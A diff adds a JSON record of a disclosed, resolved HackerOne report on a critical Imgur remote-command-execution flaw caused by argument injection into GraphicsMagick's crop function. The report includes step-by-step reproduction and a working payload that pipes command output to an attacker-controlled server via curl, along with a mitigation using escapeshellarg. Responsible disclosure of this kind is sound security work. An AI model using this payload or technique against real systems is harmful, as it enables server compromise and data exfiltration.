@@ -1,0 +1,122 @@
+{
+  "id": 212696,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTI2OTY=",
+  "url": "https://hackerone.com/reports/212696",
+  "title": "RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-03-12T03:46:46.948Z",
+  "submitted_at": "2017-03-12T03:46:46.948Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "neex",
+    "url": "/neex",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mxguogqjdb4jdwjc379o0se6457e/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 638,
+    "url": "https://hackerone.com/imgur",
+    "handle": "imgur",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Imgur",
+      "twitter_handle": "imgur",
+      "website": "http://imgur.com",
+      "about": "The most awesome images on the Internet."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2016-10033"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-04-26T21:30:28.855Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-03-27T21:30:17.395Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nThe `y` parameter of `/edit/process` endpoint (with `a=crop`) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably `gm convert`). Due to GraphicsMagick's hacker-friendly processing of `|`-starting filenames supplied to `-write` option, it leads to command execution.\n\n### Reproduction steps\n\n0. Enable Burp Proxy or similar software that allows you to log and edit HTTP requests.\n1. Login into your imgur account and upload an image.\n2. Move your mouse over the image, click on the tiny button with pencil on it, then click \"Edit\".\n3. Select a random rectangle on the image, then click \"Apply\".\n4. In the burp suite, you will see a request to an URL like this:  `http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510`\n\n     Change the `y` parameter of the request so it becomes `0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-`. \n\n     The full URL after the change must look like `http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303`, note that you have to change `<your-server>` to a webserver under your control).\n\n5. Fire a request to the modified URL. The command (`ps aux|curl http://<your-server> -d @-`) will be executed somewhere inside imgur, and you will get a HTTP request to `<your-server>` with the result of `ps aux` in the POST body.  You can replace `ps aux` with another command (but you have to write `${IFS}` instead of spaces).\n\n### Detailed description\n\nI was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of `y` GET parameter) goes into a shell command. While all special characters (like `|`, `$` and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is `escapeshellcmd` PHP function, but that can also be some kind of custom input filtering/processing.\n\nThe rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by \"Crop/Resize\" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended ` -rotate 90` to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably `gm convert` utility). I read the documentation and found that `-write` argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.\n\n### Mitigation\n\nProbably either some kind of custom processing or `escapeshellcmd` function is used to construct the command line. In both cases, replace it with applying `escapeshellarg` to individual arguments. In the second case, you probably want to run `grep -R escapeshellcmd <path to the source code>` to find more vulns :-)\n",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-04-26T21:30:17.429Z",
+  "allow_singular_disclosure_after": -285098458.75097555,
+  "singular_disclosure_allowed": true,
+  "vote_count": 229,
+  "voters": [
+    "subzero1993",
+    "mattibijnens",
+    "rc0r",
+    "zhchbin",
+    "jokebookservice1",
+    "durg78",
+    "orange303",
+    "irvinlim",
+    "cxzer0",
+    "b1ngz",
+    "and 219 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
